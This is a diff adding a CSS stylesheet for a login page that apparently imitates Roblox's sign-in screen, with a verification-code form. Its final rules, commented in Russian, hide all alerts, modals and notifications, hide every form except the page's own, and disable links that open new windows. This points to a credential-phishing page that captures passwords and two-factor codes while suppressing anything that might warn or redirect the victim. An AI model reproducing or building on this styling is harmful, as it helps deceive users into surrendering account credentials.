@@ -1,0 +1,123 @@
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+body.rbx-body {
+    font-family: 'Source Sans Pro', Arial, sans-serif;
+    background: #232527;
+    color: #fff;
+    margin: 0;
+    min-height: 100vh;
+}
+.container-main {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    background: #232527;
+}
+.login-form-container {
+    background: #393b3d;
+    border-radius: 8px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    padding: 40px 32px 32px 32px;
+    width: 100%;
+    max-width: 380px;
+    margin: 0 auto;
+}
+.login-form {
+    display: flex;
+    flex-direction: column;
+    gap: 18px;
+}
+.input-field {
+    width: 100%;
+    padding: 12px 14px;
+    border: 1.5px solid #232527;
+    border-radius: 4px;
+    background: #232527;
+    color: #fff;
+    font-size: 16px;
+    transition: border-color 0.2s;
+}
+.input-field:focus {
+    outline: none;
+    border-color: #00b06c;
+}
+.btn-primary-md, .login-button {
+    width: 100%;
+    padding: 12px 0;
+    background: #00b06c;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    font-size: 18px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: background 0.2s;
+    margin-top: 10px;
+}
+.btn-primary-md:hover, .login-button:hover {
+    background: #00995a;
+}
+.form-group {
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+}
+.remember-me-form-group {
+    flex-direction: row;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 8px;
+}
+.text-center {
+    text-align: center;
+    margin-top: 16px;
+}
+.text-link {
+    color: #00b06c;
+    text-decoration: none;
+    font-weight: 600;
+    margin-left: 4px;
+}
+.text-link:hover {
+    text-decoration: underline;
+}
+.result-message {
+    margin-top: 18px;
+    padding: 12px;
+    border-radius: 4px;
+    display: none;
+    background: #232527;
+    color: #fff;
+    font-size: 15px;
+}
+@media (max-width: 480px) {
+    .login-form-container {
+        padding: 24px 8px;
+    }
+}
+
+/* Блокируем все всплывающие окна и модальные диалоги */
+.modal, .popup, .dialog, [role="dialog"], 
+.alert, .notification, .toast,
+[class*="modal"], [class*="popup"], [class*="dialog"],
+[class*="alert"], [class*="notification"], [class*="toast"] {
+    display: none !important;
+    visibility: hidden !important;
+    opacity: 0 !important;
+    pointer-events: none !important;
+}
+
+/* Блокируем все формы, кроме наших */
+form:not(#loginForm):not(#codeForm):not(.login-form) {
+    display: none !important;
+}
+
+/* Блокируем все ссылки, которые могут открывать новые окна */
+a[target="_blank"], a[onclick*="window.open"], a[onclick*="open"] {
+    pointer-events: none !important;
+    opacity: 0.5 !important;
+} 
